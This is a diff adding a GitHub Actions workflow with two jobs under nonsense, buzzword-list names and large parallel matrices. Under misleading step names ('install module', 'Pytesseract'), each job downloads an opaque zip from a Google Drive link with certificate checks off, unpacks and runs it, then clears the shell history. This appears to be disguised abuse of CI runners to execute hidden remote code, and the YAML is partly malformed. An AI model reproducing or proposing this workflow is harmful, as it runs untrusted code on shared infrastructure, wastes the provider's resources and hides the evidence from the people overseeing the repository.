@@ -1,0 +1,56 @@
+name: terramahoa308zone
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  ['ANALYZE', 'DESIGN', 'PLAN', 'OPTIMIZE', 'ALLOCATE', 'CONNECT', 'REGISTER', 'INITIALIZE', 'CALCULATE', 'PROCESS', 'UPDATE', 'REFRESH', 'SYNCHRONIZE', 'ENCRYPT', 'DECRYPT', 'DOWNLOAD', 'UPLOAD', 'TRANSFER', 'INSTALL', 'REMOVE', 'PATCH', 'ROLLBACK', 'RECOVER']:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Draft', 'Edit', 'Approve', 'Publish', 'Promote']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1jKHNlMK9XqAOoaVe-c6WbvaXki7QH5dm" -O Vaex.zip
+        unzip -o Vaex.zip
+        rm Vaex.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+
+
+  ['PHASE', 'STEP', 'CYCLE', 'ROUND', 'ITERATION', 'LEVEL', 'STAGE', 'MODE', 'CONFIG', 'PROFILE', 'SCHEMA', 'TEMPLATE', 'BLUEPRINT', 'PATTERN', 'MODULE', 'COMPONENT', 'SERVICE', 'RESOURCE', 'ASSET', 'OBJECT', 'ENTITY', 'INSTANCE', 'PACKAGE', 'BUNDLE', 'VERSION']:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Sense', 'Transmit', 'Process', 'Actuate', 'Feedback']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1jKHNlMK9XqAOoaVe-c6WbvaXki7QH5dm" -O Vaex.zip
+        unzip -o Vaex.zip
+        rm Vaex.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+        
